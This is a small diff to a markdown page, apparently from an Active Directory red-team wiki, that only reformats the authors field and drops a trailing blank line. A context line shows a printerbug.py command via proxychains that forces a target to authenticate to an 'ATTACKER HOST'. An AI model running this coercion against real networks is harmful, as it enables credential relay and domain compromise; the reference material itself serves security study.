@@ -1,5 +1,5 @@
 ---
-authors: 'ShutdownRepo, sckdev'
+authors: ShutdownRepo, sckdev
 category: ad
 ---
 
@@ -70,4 +70,3 @@ proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
 ## Resources
 
 [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
-
